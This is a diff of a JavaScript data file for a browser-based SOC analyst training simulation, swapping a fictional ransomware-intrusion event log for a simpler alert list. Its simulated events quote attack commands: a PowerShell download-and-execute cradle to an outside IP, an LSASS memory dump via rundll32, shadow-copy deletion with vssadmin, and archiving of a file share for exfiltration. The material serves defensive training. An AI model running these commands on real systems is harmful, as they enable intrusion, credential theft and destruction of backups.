@@ -1,210 +1,325 @@
-/* ==========================================================================
-   Raqib SIEM — data layer for the SOC Analyst Simulation
-   "Raqib" (رقيب) means "watcher/monitor". This module builds a self-consistent
-   set of security events for a single shift at a fictional company, GulfPay,
-   plus the offenses (correlated incidents) a SIEM would raise from them.
+// soc-data.js - Centralized data management for SOC Simulation
+// This simulates what would typically come from a backend API/database
 
-   Everything here is generated in the browser. There is no backend; times are
-   anchored to "shift start" so the console always looks live.
-   ========================================================================== */
-(function (global) {
-    'use strict';
-
-    const ORG = {
-        name: 'GulfPay',
-        domain: 'gulfpay.local',
-        analyst: 'a.alghamdi',
-        shiftStartHour: 8
-    };
-
-    const HOSTS = {
-        'FIN-WS03': { ip: '10.20.14.53', user: 'j.harbi', dept: 'Finance', os: 'Windows 11 23H2', role: 'Workstation' },
-        'FIN-WS07': { ip: '10.20.14.57', user: 'n.otaibi', dept: 'Finance', os: 'Windows 11 23H2', role: 'Workstation' },
-        'HR-WS02': { ip: '10.20.16.22', user: 's.dosari', dept: 'HR', os: 'Windows 11 23H2', role: 'Workstation' },
-        'FILE-SRV01': { ip: '10.20.8.10', user: 'SYSTEM', dept: 'IT', os: 'Windows Server 2022', role: 'File server' },
-        'DC01': { ip: '10.20.8.2', user: 'SYSTEM', dept: 'IT', os: 'Windows Server 2022', role: 'Domain controller' },
-        'VPN-GW': { ip: '10.20.0.1', user: '-', dept: 'IT', os: 'PAN-OS', role: 'VPN gateway' },
-        'WEB-DMZ01': { ip: '172.16.3.10', user: 'www-data', dept: 'IT', os: 'Ubuntu 22.04', role: 'Web server' }
-    };
-
-    const EXTERNAL = {
-        c2: '185.225.19.44',
-        exfil: '91.219.236.18',
-        spray: '45.155.205.233',
-        scanner: '10.10.5.20'
-    };
-
-    let seed = 1337;
-    function rand() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
-    function pick(a) { return a[Math.floor(rand() * a.length)]; }
-
-    const shiftStart = new Date();
-    shiftStart.setHours(ORG.shiftStartHour, 0, 0, 0);
-    if (Date.now() < shiftStart.getTime()) shiftStart.setDate(shiftStart.getDate() - 1);
-    const at = (m) => new Date(shiftStart.getTime() + m * 60000);
-
-    let uid = 0;
-    const ev = (o) => Object.assign({ _id: 'e' + (++uid) }, o);
-
-    /* ---- the storyline: a finance-department ransomware intrusion ---- */
-    const STORY = [];
-    const S = (min, host, o) => STORY.push(ev(Object.assign({
-        time: at(min), host: host, ip: HOSTS[host] ? HOSTS[host].ip : '', user: HOSTS[host] ? HOSTS[host].user : '', chain: true
-    }, o)));
-
-    S(6,  'FIN-WS03', { source: 'email', action: 'delivered', signature: 'Inbound email with macro attachment', severity: 'low',
-        msg: 'Email "Invoice_Q2_OVERDUE.docm" from billing@gulfpay-invoices.com delivered to j.harbi@gulfpay.local', extra: { sender: 'billing@gulfpay-invoices.com', attachment: 'Invoice_Q2_OVERDUE.docm', spf: 'fail' } });
-    S(9,  'FIN-WS03', { source: 'edr', action: 'process', signature: 'Office application spawned scripting engine', severity: 'high',
-        msg: 'WINWORD.EXE spawned powershell.exe with encoded command', extra: { parent: 'WINWORD.EXE', process: 'powershell.exe', cmdline: 'powershell -nop -w hidden -enc SQBFAFgAKA...' }, technique: 'T1566.001' });
-    S(10, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Encoded PowerShell download cradle', severity: 'high',
-        msg: 'powershell.exe decoded to IEX (New-Object Net.WebClient).DownloadString("http://185.225.19.44/a")', extra: { process: 'powershell.exe', cmdline: 'IEX (New-Object Net.WebClient).DownloadString("http://185.225.19.44/a")' }, technique: 'T1059.001' });
-    S(11, 'FIN-WS03', { source: 'firewall', action: 'allow', signature: 'Outbound connection to new external host', severity: 'medium',
-        msg: 'Allowed 10.20.14.53 -> 185.225.19.44:443 (uncategorized)', extra: { dst: EXTERNAL.c2, dport: 443, bytes: 2140 } });
-    S(14, 'FIN-WS03', { source: 'ids', action: 'alert', signature: 'ET MALWARE Cobalt Strike beacon (HTTPS)', severity: 'critical',
-        msg: 'Beacon pattern to 185.225.19.44 every 60s from 10.20.14.53', extra: { dst: EXTERNAL.c2 }, technique: 'T1071.001' });
-    S(22, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Credential dumping behavior (LSASS access)', severity: 'critical',
-        msg: 'Suspicious handle to lsass.exe by rundll32.exe (comsvcs.dll MiniDump)', extra: { process: 'rundll32.exe', cmdline: 'rundll32 comsvcs.dll MiniDump 656 lsass.dmp full' }, technique: 'T1003.001' });
-    S(34, 'DC01',     { source: 'auth', action: 'success', signature: 'Service account TGT off-hours', severity: 'high',
-        msg: 'svc_backup authenticated from 10.20.14.53 (first time from this host)', extra: { account: 'svc_backup', logon_type: 3, src: HOSTS['FIN-WS03'].ip }, technique: 'T1550' });
-    S(41, 'FILE-SRV01', { source: 'auth', action: 'success', signature: 'Remote logon with service account', severity: 'high',
-        msg: 'svc_backup logged on to FILE-SRV01 via SMB from 10.20.14.53', extra: { account: 'svc_backup', logon_type: 3, src: HOSTS['FIN-WS03'].ip }, technique: 'T1021.002' });
-    S(45, 'FILE-SRV01', { source: 'edr', action: 'process', signature: 'Archive utility run on file share', severity: 'medium',
-        msg: '7z.exe archiving \\\\FILE-SRV01\\Finance\\* to C:\\Windows\\Temp\\fin.7z', extra: { process: '7z.exe', cmdline: '7z a -mx1 C:\\Windows\\Temp\\fin.7z \\\\FILE-SRV01\\Finance\\*' }, technique: 'T1560.001' });
-    S(52, 'FILE-SRV01', { source: 'firewall', action: 'allow', signature: 'Large outbound transfer to external host', severity: 'critical',
-        msg: '2.6 GB uploaded 10.20.8.10 -> 91.219.236.18:443', extra: { dst: EXTERNAL.exfil, dport: 443, bytes: 2684354560 }, technique: 'T1041' });
-    S(58, 'FIN-WS03', { source: 'edr', action: 'process', signature: 'Volume shadow copies deleted', severity: 'critical',
-        msg: 'vssadmin.exe delete shadows /all /quiet executed on FIN-WS03', extra: { process: 'vssadmin.exe', cmdline: 'vssadmin delete shadows /all /quiet' }, technique: 'T1490' });
-    S(61, 'FIN-WS03', { source: 'edr', action: 'alert', signature: 'Mass file modification consistent with ransomware', severity: 'critical',
-        msg: '1,240 files renamed to *.gpay in C:\\Users\\j.harbi within 40s; ransom note RECOVER_FILES.txt written', extra: { extension: '.gpay', note: 'RECOVER_FILES.txt' }, technique: 'T1486' });
-
-    /* ---- background noise + two decoy offenses ----------------------- */
-    const NOISE = [];
-    const N = (min, host, o) => NOISE.push(ev(Object.assign({ time: at(min), host: host, ip: HOSTS[host] ? HOSTS[host].ip : '', user: HOSTS[host] ? HOSTS[host].user : '', chain: false }, o)));
-
-    for (let i = 0; i < 40; i++) {
-        const h = pick(['FIN-WS07', 'HR-WS02', 'FIN-WS03']);
-        N(Math.floor(rand() * 240), h, { source: 'auth', action: 'success', signature: 'Interactive logon', severity: 'info',
-            msg: HOSTS[h].user + ' logged on to ' + h, extra: { logon_type: 2 } });
-    }
-    for (let i = 0; i < 30; i++) {
-        N(Math.floor(rand() * 240), 'WEB-DMZ01', { source: 'web', action: 'allow', signature: 'HTTP request', severity: 'info',
-            msg: 'GET /api/health 200 from ' + (Math.floor(rand() * 200) + 20) + '.12.44.' + Math.floor(rand() * 200), extra: { status: 200 } });
-    }
-    N(30, 'FIN-WS07', { source: 'ids', action: 'alert', signature: 'Internal port scan detected', severity: 'medium',
-        msg: 'Host 10.10.5.20 scanned 10.20.14.0/24 (authorized scanner)', extra: { src: EXTERNAL.scanner } });
-    for (let i = 0; i < 38; i++) {
-        N(18 + Math.floor(rand() * 6), 'VPN-GW', { source: 'auth', action: 'failure', signature: 'VPN authentication failed', severity: 'medium',
-            msg: 'Failed VPN login for ' + pick(['admin', 'test', 'a.harbi', 's.dosari', 'root', 'helpdesk']) + ' from 45.155.205.233', extra: { src: EXTERNAL.spray, sprayGroup: true } });
-    }
-    N(70, 'WEB-DMZ01', { source: 'web', action: 'alert', signature: 'TLS certificate expiring', severity: 'low',
-        msg: 'Certificate for pay.gulfpay.com expires in 6 days', extra: {} });
-    N(88, 'FILE-SRV01', { source: 'firewall', action: 'alert', signature: 'Cleartext protocol on internal network', severity: 'low',
-        msg: 'FTP (cleartext) observed 10.20.16.22 -> 10.20.8.10', extra: {} });
-    for (let i = 0; i < 6; i++) {
-        N(Math.floor(rand() * 240), pick(['HR-WS02', 'FIN-WS07']), { source: 'edr', action: 'quarantine', signature: 'PUA quarantined', severity: 'low',
-            msg: 'Potentially unwanted app quarantined (' + pick(['Toolbar', 'DriverUpdater', 'CouponHelper']) + ')', extra: {} });
-    }
-
-    const LOGS = STORY.concat(NOISE).sort((a, b) => a.time - b.time);
-
-    const chainIds = STORY.map((e) => e._id);
-    const sprayIds = NOISE.filter((e) => e.extra && e.extra.sprayGroup).map((e) => e._id);
-
-    const OFFENSES = [
+const SOCData = {
+    // Alert data with full details
+    alerts: [
         {
-            id: 'OF-1042', title: 'Ransomware kill chain on FIN-WS03', severity: 'critical', status: 'open',
-            category: 'Malware / Ransomware', firstSeen: at(6), lastSeen: at(61),
-            sourceHost: 'FIN-WS03', sourceUser: 'j.harbi', magnitude: 9.4, eventIds: chainIds,
-            techniques: ['T1566.001', 'T1059.001', 'T1071.001', 'T1003.001', 'T1021.002', 'T1560.001', 'T1041', 'T1490', 'T1486'],
-            summary: 'A malicious macro on FIN-WS03 led to a Cobalt Strike beacon, credential theft, lateral movement to FILE-SRV01, 2.6 GB of finance data exfiltrated, shadow copies deleted and file encryption starting. This is an active, high-impact intrusion.',
-            recommended: ['isolate_host', 'block_c2', 'disable_account', 'block_exfil', 'escalate'],
-            playbook: 'ransomware'
-        },
-        {
-            id: 'OF-1043', title: 'VPN password spray from 45.155.205.233', severity: 'high', status: 'open',
-            category: 'Credential Access', firstSeen: at(18), lastSeen: at(24),
-            sourceHost: 'VPN-GW', sourceUser: '-', magnitude: 6.1, eventIds: sprayIds,
-            techniques: ['T1110.003'],
-            summary: '38 failed VPN logins against 6 accounts from a single external IP in a short window, with no success. A password-spray attempt that has not yet broken in.',
-            recommended: ['block_source', 'notify_users', 'escalate'],
-            playbook: 'bruteforce'
-        },
-        {
-            id: 'OF-1044', title: 'TLS certificate for pay.gulfpay.com expiring', severity: 'low', status: 'open',
-            category: 'Hygiene', firstSeen: at(70), lastSeen: at(70),
-            sourceHost: 'WEB-DMZ01', sourceUser: 'www-data', magnitude: 2.0,
-            eventIds: NOISE.filter((e) => e.signature === 'TLS certificate expiring').map((e) => e._id),
-            techniques: [],
-            summary: 'A public certificate expires in six days. Not an attack; route to the platform team as a hygiene ticket so it does not become an outage.',
-            recommended: ['ticket', 'close'], playbook: null
-        }
-    ];
-
-    const ACTIONS = {
-        isolate_host: { label: 'Isolate host from network', icon: 'fa-network-wired', kind: 'contain', ok: 'FIN-WS03 isolated. Beacon and encryption traffic cut off.' },
-        block_c2: { label: 'Block C2 IP at firewall', icon: 'fa-ban', kind: 'contain', ok: '185.225.19.44 blocked outbound at the perimeter.' },
-        block_exfil: { label: 'Block exfil IP at firewall', icon: 'fa-ban', kind: 'contain', ok: '91.219.236.18 blocked. No further data can leave.' },
-        block_source: { label: 'Block source IP at VPN', icon: 'fa-ban', kind: 'contain', ok: '45.155.205.233 blocked at the VPN gateway.' },
-        disable_account: { label: 'Disable compromised account', icon: 'fa-user-lock', kind: 'eradicate', ok: 'svc_backup disabled and sessions revoked.' },
-        reset_creds: { label: 'Force credential reset', icon: 'fa-key', kind: 'eradicate', ok: 'Password reset forced for affected accounts.' },
-        notify_users: { label: 'Notify affected users', icon: 'fa-envelope', kind: 'notify', ok: 'Owners of the sprayed accounts notified to watch for prompts.' },
-        ticket: { label: 'Raise a hygiene ticket', icon: 'fa-ticket', kind: 'notify', ok: 'Ticket routed to the platform team.' },
-        escalate: { label: 'Escalate to IR / Tier 2', icon: 'fa-arrow-up-right-dots', kind: 'escalate', ok: 'Incident response team paged with the timeline.' },
-        collect_forensics: { label: 'Collect forensic triage', icon: 'fa-microscope', kind: 'investigate', ok: 'Memory and disk triage collected from FIN-WS03.' },
-        close: { label: 'Close offense', icon: 'fa-check', kind: 'close', ok: 'Offense closed.' }
-    };
-
-    const FIELDS = ['source', 'action', 'severity', 'host', 'ip', 'user', 'signature', 'technique'];
-
-    const PLAYBOOKS = {
-        ransomware: {
-            name: 'Ransomware response', category: 'Malware',
-            steps: [
-                'Isolate the affected host from the network to stop encryption and lateral movement.',
-                'Block the command-and-control and exfiltration IPs at the perimeter.',
-                'Disable any accounts used by the attacker and revoke active sessions.',
-                'Collect volatile evidence (memory, running processes) before powering off.',
-                'Identify scope: which shares, hosts and data were touched.',
-                'Escalate to the incident response team and notify stakeholders per policy.',
-                'Restore from known-good backups once the environment is clean.'
+            id: 'EDR-RW-20250501-001',
+            title: 'Potential Ransomware Activity Detected',
+            severity: 'critical',
+            source: 'endpoint',
+            sourceDetail: 'EDR - Endpoint 192.168.1.45',
+            timestamp: new Date(Date.now() - 15 * 60000), // 15 minutes ago
+            status: 'new',
+            user: 'jsmith@company.com',
+            hostname: 'DESKTOP-FINANCE03',
+            ipAddress: '192.168.1.45',
+            description: 'The EDR system detected multiple suspicious activities consistent with ransomware behavior on endpoint 192.168.1.45. This includes mass file encryption attempts, deletion of shadow copies, and communication with known malicious command and control servers.',
+            activities: [
+                {
+                    timestamp: '10:42:15 AM',
+                    activity: 'Process Creation',
+                    details: 'Suspicious PowerShell command with encoded parameters',
+                    severity: 'High'
+                },
+                {
+                    timestamp: '10:43:22 AM',
+                    activity: 'Command Execution',
+                    details: 'vssadmin delete shadows /all /quiet',
+                    severity: 'Critical'
+                },
+                {
+                    timestamp: '10:43:48 AM',
+                    activity: 'Registry Modification',
+                    details: 'Multiple registry keys associated with persistence',
+                    severity: 'High'
+                },
+                {
+                    timestamp: '10:44:05 AM',
+                    activity: 'Network Connection',
+                    details: 'Connection to known C2 server (185.122.58.12)',
+                    severity: 'Critical'
+                },
+                {
+                    timestamp: '10:44:37 AM',
+                    activity: 'File System Activity',
+                    details: 'Multiple file extension changes (.doc → .encrypted)',
+                    severity: 'Critical'
+                }
+            ],
+            systemInfo: {
+                hostname: 'DESKTOP-FINANCE03',
+                ipAddress: '192.168.1.45',
+                user: 'jsmith@company.com (John Smith - Finance Department)',
+                os: 'Windows 10 Pro 21H2 (OS Build 19044.2251)',
+                lastPatch: 'April 28, 2025'
+            },
+            recommendations: [
+                'Isolate the affected endpoint immediately to prevent lateral movement and further encryption.',
+                'Disable the user account and force password reset for all accounts that may have been logged into the affected system.',
+                'Block all communication to the identified command and control IP address (185.122.58.12) at the firewall.',
+                'Scan all systems for similar indicators of compromise, especially within the same department.',
+                'Preserve forensic evidence for detailed analysis and potential legal requirements.',
+                'Initiate incident response plan and notify appropriate stakeholders according to the procedure.'
             ]
         },
-        bruteforce: {
-            name: 'Brute force / password spray', category: 'Authentication',
-            steps: [
-                'Confirm whether any login succeeded from the source.',
-                'Block the source IP at the gateway.',
-                'Notify targeted account owners and force resets if a success is found.',
-                'Review MFA coverage and lockout thresholds.',
-                'Add the indicator to the watchlist and monitor for return.'
-            ]
+        {
+            id: 'AUTH-BF-20250501-002',
+            title: 'Multiple Failed Login Attempts',
+            severity: 'high',
+            source: 'auth',
+            sourceDetail: 'Authentication - VPN Gateway',
+            timestamp: new Date(Date.now() - 32 * 60000),
+            status: 'new',
+            description: 'Detected 47 failed login attempts from IP 203.45.12.88 targeting multiple user accounts within a 5-minute window.'
+        },
+        {
+            id: 'EDR-PS-20250501-003',
+            title: 'Suspicious PowerShell Command Execution',
+            severity: 'high',
+            source: 'endpoint',
+            sourceDetail: 'EDR - Endpoint 192.168.1.23',
+            timestamp: new Date(Date.now() - 47 * 60000),
+            status: 'new',
+            description: 'PowerShell script with encoded command detected. Possible data exfiltration or reconnaissance activity.'
+        },
+        {
+            id: 'IDS-EX-20250501-004',
+            title: 'Data Exfiltration Attempt Detected',
+            severity: 'critical',
+            source: 'ids',
+            sourceDetail: 'IDS - Network Sensor 3',
+            timestamp: new Date(Date.now() - 60 * 60000),
+            status: 'new',
+            description: 'Large volume of data transfer to external IP detected. Transfer size: 2.3 GB over encrypted channel.'
+        },
+        {
+            id: 'AUTH-AT-20250501-005',
+            title: 'Unusual Authentication Time',
+            severity: 'medium',
+            source: 'auth',
+            sourceDetail: 'Authentication - Office 365',
+            timestamp: new Date(Date.now() - 90 * 60000),
+            status: 'new',
+            description: 'User login detected at 3:47 AM, outside normal working hours for this account.'
+        },
+        {
+            id: 'FW-DLP-20250501-006',
+            title: 'Unencrypted Data Transfer Detected',
+            severity: 'medium',
+            source: 'firewall',
+            sourceDetail: 'DLP - Web Proxy',
+            timestamp: new Date(Date.now() - 120 * 60000),
+            status: 'new',
+            description: 'Sensitive data transmitted over unencrypted HTTP connection.'
+        },
+        {
+            id: 'VS-SW-20250501-007',
+            title: 'Outdated Software Version',
+            severity: 'low',
+            source: 'cloud',
+            sourceDetail: 'Vulnerability Scanner',
+            timestamp: new Date(Date.now() - 180 * 60000),
+            status: 'new',
+            description: 'Apache server version 2.4.41 detected with known vulnerabilities. Update available.'
+        },
+        {
+            id: 'CM-SSL-20250501-008',
+            title: 'SSL Certificate Expiring Soon',
+            severity: 'low',
+            source: 'cloud',
+            sourceDetail: 'Certificate Monitor',
+            timestamp: new Date(Date.now() - 240 * 60000),
+            status: 'new',
+            description: 'SSL certificate for api.company.com expires in 14 days.'
         }
-    };
+    ],
 
-    const REFERENCE_PLAYBOOKS = [
-        { name: 'Ransomware Response', category: 'Malware', updated: 'Apr 25, 2025', status: 'active' },
-        { name: 'Phishing Investigation', category: 'Email Security', updated: 'Apr 22, 2025', status: 'active' },
-        { name: 'Data Exfiltration Response', category: 'Data Loss Prevention', updated: 'Apr 15, 2025', status: 'active' },
-        { name: 'Brute Force / Password Spray', category: 'Authentication', updated: 'Apr 10, 2025', status: 'active' },
-        { name: 'Insider Threat Investigation', category: 'User Activity', updated: 'Apr 05, 2025', status: 'active' },
-        { name: 'Cloud Account Compromise', category: 'Cloud Security', updated: 'Mar 28, 2025', status: 'active' },
-        { name: 'Business Email Compromise', category: 'Email Security', updated: 'Mar 20, 2025', status: 'active' },
-        { name: 'Malware Analysis', category: 'Malware', updated: 'Mar 10, 2025', status: 'active' }
-    ];
+    // Playbooks data with pagination
+    playbooks: [
+        // Page 1
+        [
+            { name: 'Ransomware Response', category: 'Malware', updated: 'April 25, 2025', status: 'active', content: 'Full ransomware response playbook content...' },
+            { name: 'Phishing Investigation', category: 'Email Security', updated: 'April 22, 2025', status: 'active', content: 'Phishing investigation procedures...' },
+            { name: 'Data Exfiltration Response', category: 'Data Loss Prevention', updated: 'April 15, 2025', status: 'active', content: 'Data exfiltration response steps...' },
+            { name: 'Brute Force Attack Response', category: 'Authentication', updated: 'April 10, 2025', status: 'active', content: 'Brute force mitigation playbook...' },
+            { name: 'Insider Threat Investigation', category: 'User Activity', updated: 'April 05, 2025', status: 'active', content: 'Insider threat investigation guide...' },
+            { name: 'Cloud Account Compromise', category: 'Cloud Security', updated: 'March 28, 2025', status: 'active', content: 'Cloud account compromise response...' },
+            { name: 'DDoS Mitigation', category: 'Network Security', updated: 'March 20, 2025', status: 'active', content: 'DDoS attack mitigation procedures...' },
+            { name: 'Malicious URL Investigation', category: 'Web Security', updated: 'March 15, 2025', status: 'active', content: 'Malicious URL investigation steps...' }
+        ],
+        // Page 2
+        [
+            { name: 'Malware Analysis', category: 'Malware', updated: 'March 10, 2025', status: 'active', content: 'Malware analysis procedures...' },
+            { name: 'SQL Injection Response', category: 'Application Security', updated: 'March 05, 2025', status: 'active', content: 'SQL injection incident response...' },
+            { name: 'Privilege Escalation Investigation', category: 'Access Control', updated: 'February 28, 2025', status: 'active', content: 'Privilege escalation investigation...' },
+            { name: 'Zero-Day Vulnerability Response', category: 'Vulnerability Management', updated: 'February 20, 2025', status: 'active', content: 'Zero-day vulnerability handling...' },
+            { name: 'Social Engineering Incident', category: 'Security Awareness', updated: 'February 15, 2025', status: 'active', content: 'Social engineering response...' },
+            { name: 'Data Breach Response', category: 'Incident Response', updated: 'February 10, 2025', status: 'active', content: 'Data breach response procedures...' },
+            { name: 'APT Investigation', category: 'Threat Hunting', updated: 'February 05, 2025', status: 'active', content: 'APT investigation playbook...' },
+            { name: 'Business Email Compromise', category: 'Email Security', updated: 'January 30, 2025', status: 'active', content: 'BEC investigation guide...' }
+        ],
+        // Page 3
+        [
+            { name: 'Cryptojacking Detection', category: 'Malware', updated: 'January 25, 2025', status: 'active', content: 'Cryptojacking detection and response...' },
+            { name: 'Supply Chain Attack', category: 'Third-Party Risk', updated: 'January 20, 2025', status: 'active', content: 'Supply chain compromise response...' },
+            { name: 'Container Security Incident', category: 'Cloud Security', updated: 'January 15, 2025', status: 'active', content: 'Container security incident response...' },
+            { name: 'IoT Device Compromise', category: 'IoT Security', updated: 'January 10, 2025', status: 'inactive', content: 'IoT device compromise procedures...' },
+            { name: 'Credential Stuffing Attack', category: 'Authentication', updated: 'January 05, 2025', status: 'active', content: 'Credential stuffing response...' },
+            { name: 'DNS Tunneling Detection', category: 'Network Security', updated: 'December 28, 2024', status: 'active', content: 'DNS tunneling investigation...' }
+        ]
+    ],
 
-    const TECHNIQUES = {
-        'T1566.001': 'Phishing: Spearphishing Attachment',
-        'T1059.001': 'Command and Scripting Interpreter: PowerShell',
-        'T1071.001': 'Application Layer Protocol: Web Protocols',
-        'T1003.001': 'OS Credential Dumping: LSASS Memory',
-        'T1021.002': 'Remote Services: SMB / Windows Admin Shares',
-        'T1550': 'Use Alternate Authentication Material',
-        'T1560.001': 'Archive Collected Data: via Utility',
-        'T1041': 'Exfiltration Over C2 Channel',
-        'T1490': 'Inhibit System Recovery',
-        'T1486': 'Data Encrypted for Impact',
-        'T1110.003': 'Brute Force: Password Spraying'
-    };
+    // Cases data with pagination
+    cases: [
+        // Page 1
+        [
+            { id: 'INC-2025-042', title: 'Finance Department Ransomware Investigation', severity: 'Critical', assigned: 'Incident Response Team', status: 'in-progress' },
+            { id: 'INC-2025-041', title: 'Executive Account Compromise Attempt', severity: 'High', assigned: 'Michael Chen', status: 'in-progress' },
+            { id: 'INC-2025-040', title: 'Unusual Database Activity Investigation', severity: 'Medium', assigned: 'Sarah Johnson', status: 'pending' },
+            { id: 'INC-2025-039', title: 'Suspected Data Exfiltration via Email', severity: 'High', assigned: 'David Wilson', status: 'in-progress' },
+            { id: 'INC-2025-038', title: 'Cloud Storage Misconfiguration', severity: 'Medium', assigned: 'Cloud Security Team', status: 'closed' },
+            { id: 'INC-2025-037', title: 'Web Application Vulnerability', severity: 'Medium', assigned: 'Application Security Team', status: 'closed' }
+        ],
+        // Page 2
+        [
+            { id: 'INC-2025-036', title: 'Phishing Campaign Targeting HR', severity: 'High', assigned: 'Email Security Team', status: 'closed' },
+            { id: 'INC-2025-035', title: 'Suspicious Network Scanning', severity: 'Medium', assigned: 'Network Security', status: 'closed' },
+            { id: 'INC-2025-034', title: 'Malware Detected on Development Server', severity: 'High', assigned: 'DevSec Team', status: 'closed' },
+            { id: 'INC-2025-033', title: 'Unauthorized API Access', severity: 'Critical', assigned: 'API Security Team', status: 'closed' },
+            { id: 'INC-2025-032', title: 'DDoS Attack Mitigation', severity: 'High', assigned: 'Network Operations', status: 'closed' },
+            { id: 'INC-2025-031', title: 'Insider Threat Investigation', severity: 'Critical', assigned: 'Security Operations', status: 'closed' }
+        ],
+        // Page 3
+        [
+            { id: 'INC-2025-030', title: 'Compromised Service Account', severity: 'High', assigned: 'IAM Team', status: 'closed' },
+            { id: 'INC-2025-029', title: 'Data Leakage via Public Repository', severity: 'Critical', assigned: 'DevSec Team', status: 'closed' },
+            { id: 'INC-2025-028', title: 'Mobile Device Compromise', severity: 'Medium', assigned: 'Mobile Security', status: 'closed' },
+            { id: 'INC-2025-027', title: 'SQL Injection Attempt', severity: 'High', assigned: 'AppSec Team', status: 'closed' }
+        ]
+    ],
 
-    global.SOC = { ORG, HOSTS, EXTERNAL, LOGS, OFFENSES, ACTIONS, FIELDS, PLAYBOOKS, REFERENCE_PLAYBOOKS, TECHNIQUES, shiftStart };
-})(window);
+    // Reports data with actual downloadable content
+    reports: [
+        // Page 1
+        [
+            { 
+                name: 'Daily Security Operations Report', 
+                type: 'Daily Summary', 
+                date: 'May 01, 2025',
+                content: {
+                    title: 'Daily Security Operations Report - May 01, 2025',
+                    summary: 'Overview of security events and incidents for the past 24 hours',
+                    metrics: {
+                        totalAlerts: 47,
+                        criticalAlerts: 3,
+                        resolvedIncidents: 12,
+                        meanTimeToResolve: '2.3 hours'
+                    },
+                    details: 'Detailed daily operations report content would go here...'
+                }
+            },
+            { 
+                name: 'Weekly Threat Intelligence Summary', 
+                type: 'Threat Intelligence', 
+                date: 'April 28, 2025',
+                content: {
+                    title: 'Weekly Threat Intelligence Summary - Week 17, 2025',
+                    threats: ['New ransomware variant detected', 'Phishing campaign targeting financial sector'],
+                    details: 'Weekly threat intelligence summary content...'
+                }
+            },
+            { 
+                name: 'Monthly Incident Response Metrics', 
+                type: 'Performance', 
+                date: 'April 30, 2025',
+                content: {
+                    title: 'Monthly Incident Response Metrics - April 2025',
+                    metrics: {
+                        incidents: 156,
+                        avgResponseTime: '1.8 hours',
+                        falsePositives: '12%'
+                    },
+                    details: 'Monthly metrics report content...'
+                }
+            },
+            { name: 'Ransomware Incident Post-Mortem', type: 'Incident Analysis', date: 'April 22, 2025', content: { title: 'Ransomware Incident Post-Mortem Analysis' } },
+            { name: 'Quarterly Vulnerability Assessment', type: 'Compliance', date: 'March 31, 2025', content: { title: 'Q1 2025 Vulnerability Assessment' } },
+            { name: 'Executive Security Dashboard', type: 'Executive Summary', date: 'April 30, 2025', content: { title: 'Executive Security Dashboard - April 2025' } }
+        ],
+        // Page 2
+        [
+            { name: 'Security Awareness Training Report', type: 'Training', date: 'April 15, 2025', content: { title: 'Security Awareness Training Q1 2025' } },
+            { name: 'Penetration Testing Results', type: 'Testing', date: 'April 10, 2025', content: { title: 'Annual Penetration Test Results' } },
+            { name: 'Compliance Audit Report', type: 'Compliance', date: 'March 28, 2025', content: { title: 'SOC 2 Compliance Audit' } },
+            { name: 'Threat Hunting Campaign Summary', type: 'Threat Hunting', date: 'March 20, 2025', content: { title: 'Q1 Threat Hunting Summary' } },
+            { name: 'Phishing Simulation Results', type: 'Testing', date: 'March 15, 2025', content: { title: 'Phishing Simulation Campaign Results' } },
+            { name: 'Third-Party Risk Assessment', type: 'Risk Management', date: 'March 10, 2025', content: { title: 'Vendor Security Assessment Q1' } }
+        ],
+        // Page 3
+        [
+            { name: 'Cloud Security Posture Report', type: 'Cloud Security', date: 'February 28, 2025', content: { title: 'Cloud Security Assessment' } },
+            { name: 'Incident Response Drill Report', type: 'Training', date: 'February 20, 2025', content: { title: 'Annual IR Tabletop Exercise' } },
+            { name: 'Security Tool Effectiveness', type: 'Performance', date: 'February 15, 2025', content: { title: 'Security Tool ROI Analysis' } },
+            { name: 'Data Loss Prevention Report', type: 'DLP', date: 'February 10, 2025', content: { title: 'DLP Activity Report Q1' } }
+        ]
+    ],
+
+    // Helper functions
+    getAlertById(id) {
+        return this.alerts.find(alert => alert.id === id);
+    },
+
+    getAlertsByFilter(filters) {
+        return this.alerts.filter(alert => {
+            const severityMatch = !filters.severity || filters.severity.includes(alert.severity);
+            const sourceMatch = !filters.source || filters.source.includes(alert.source);
+            const statusMatch = !filters.status || filters.status.includes(alert.status);
+            return severityMatch && sourceMatch && statusMatch;
+        });
+    },
+
+    updateAlertStatus(id, status) {
+        const alert = this.getAlertById(id);
+        if (alert) {
+            alert.status = status;
+            return true;
+        }
+        return false;
+    },
+
+    getStatistics() {
+        return {
+            total: this.alerts.length,
+            new: this.alerts.filter(a => a.status === 'new').length,
+            critical: this.alerts.filter(a => a.severity === 'critical' && a.status !== 'resolved').length,
+            resolved: this.alerts.filter(a => a.status === 'resolved').length
+        };
+    },
+
+    formatTimeAgo(date) {
+        const seconds = Math.floor((new Date() - date) / 1000);
+        const intervals = {
+            year: 31536000,
+            month: 2592000,
+            week: 604800,
+            day: 86400,
+            hour: 3600,
+            minute: 60
+        };
+
+        for (const [unit, secondsInUnit] of Object.entries(intervals)) {
+            const interval = Math.floor(seconds / secondsInUnit);
+            if (interval >= 1) {
+                return `${interval} ${unit}${interval === 1 ? '' : 's'} ago`;
+            }
+        }
+        return 'Just now';
+    }
+};
+
+// Export for use in other files
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = SOCData;
+}
